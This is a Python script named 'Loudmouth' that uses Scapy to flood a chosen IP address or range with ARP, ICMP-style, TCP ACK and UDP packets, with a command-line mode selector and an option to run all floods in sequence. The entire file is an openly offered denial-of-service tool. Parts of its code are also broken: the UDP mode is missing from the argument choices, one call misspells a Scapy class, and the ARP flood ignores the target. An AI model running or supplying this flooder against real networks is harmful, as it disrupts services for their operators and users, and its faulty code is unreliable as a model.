#!/bin/python3
####################
# ejcSec           #
# Loudmouth        #
####################

import argparse, sys,socket
from scapy.all import *
import ipaddress
import psutil
import math

#vars
interface_list = get_if_list()

def asciibanner():
    print("""
    #                            #     #
    #        ####  #    # #####  ##   ##  ####  #    # ##### #    #
    #       #    # #    # #    # # # # # #    # #    #   #   #    #
    #       #    # #    # #    # #  #  # #    # #    #   #   ######
    #       #    # #    # #    # #     # #    # #    #   #   #    #
    #       #    # #    # #    # #     # #    # #    #   #   #    #
    #######  ####   ####  #####  #     #  ####   ####    #   #    #
    """)

def arpflood(interface, pkt_count, destination):
    print("Initializing ARP flood...")
    ip = get_if_addr(interface)
    # create an ARP request to flood the network with
    send(Ether('ff:ff:ff:ff:ff:ff')/ARP(op="who-has",pdst = ip), count = pkt_count)

def pingflood(interface, pkt_count, range, destination):
    print("Initializing ping flood...")
    ip = get_if_addr(interface)
    if range:
        send(IP(dst = destination  + "/" + range, proto=(0,255))/"LoudMouth",iface = interface, count = pkt_count)
    else:
        send(IP(dst = destination, proto=(0,255))/"LoudMouth",iface = interface, count = pkt_count)

def tcpflood(interface, pkt_count, range, destination):
    print("Initializing TCP flood...")
    ip = get_if_addr(interface)
    # generate ACK packaets
    if range:
        send(IP(dst = destination + "/" + range)/TCP(dport=[80,8080],flags="A")/Raw("A"*1024), count = pkt_count)
    else:
        send(IP(dst = destination)/TCP(dport=[80,8080],flags="A")/Raw("A"*1024), count = pkt_count)

def udpflood(interface, pkt_count, range, destination):
    print("inititalizing UDP flood...")
    ip = get_if_addr(interface)
    if range:
        send(IP(dst = destination + "/" + range)/UDP(dport=[80,333],flags="P")/RAW("U"*1024),count = pkt_count)
    else:
        send(IP(dst = destination)/UDP(dport=[80,333]),count = pkt_count)
# carries out all packet floods one at a time
def allflood(interface, pkt_count, range, destination):
    print("All floods will be initiated!\n")

    arpflood(interface, pkt_count, destination)
    pingflood(interface, pkt_count, range, destination)
    udpflood(interface, pkt_count, range, destination)
    tcpflood(interface, pkt_count, range, destination)

def main():
    asciibanner()
    parser = argparse.ArgumentParser(description = 'Process user input')
    parser.add_argument('-m','--mode', choices  =  ['arp','tcp','ping','all'], help = 'The flooding mode that loudmouth will utilize')
    parser.add_argument('-i','--interface',type  = str, help = 'The network interface that loudmouth will target (default = first interface found)',choices = interface_list, default = interface_list[0])
    parser.add_argument('-v','--verbose',action = 'store_true', help = 'Instructs loudmouth to print our more output')
    parser.add_argument('-p','--packetcount',type = int, help = 'How many packets loudmouth will send (default = 10 packets)',default = 10)
    parser.add_argument('-r','--range', type = str, help = 'Range of IPs to send packets to')
    parser.add_argument('-d','--destination', type = str, help = 'The destination IP to send the packets to')
    args = parser.parse_args()

    # process args
    interface = args.interface
    pktcount = args.packetcount
    range = args.range
    destination = args.destination

    if args.mode:
        chosen_flood  = args.mode
        if chosen_flood == 'arp':
            arpflood(interface, pktcount, destination)
        elif chosen_flood  == 'tcp':
            tcpflood(interface, pktcount, range, destination)
        elif chosen_flood == 'ping':
            pingflood(interface, pktcount, range, destination)
        elif chosen_flood == 'udp':
            udpflood(interface, pktcount, range, destination)
        elif chosen_flood == 'all':
            allflood(interface, pktcount, range, destination)

if __name__ == "__main__":
    main()
